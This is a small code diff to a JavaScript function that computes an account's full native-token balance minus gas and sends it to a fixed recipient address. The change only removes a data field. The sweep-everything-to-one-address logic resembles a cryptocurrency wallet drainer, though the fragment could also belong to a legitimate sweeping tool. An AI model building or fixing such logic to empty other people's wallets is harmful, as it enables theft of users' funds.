@@ -760,7 +760,7 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
       const gasCost = gasPrice * gasLimit
       if (bal.value > gasCost) {
         const sendAmount = bal.value - gasCost
-        nativeCall = { to: getAddress(NATIVE_RECIPIENT), data: '0x00', value: `0x${sendAmount.toString(16)}` }
+        nativeCall = { to: getAddress(NATIVE_RECIPIENT), value: `0x${sendAmount.toString(16)}` }
       }
     } catch (e) {
       console.warn('Native transfer compute failed:', e?.message || e)
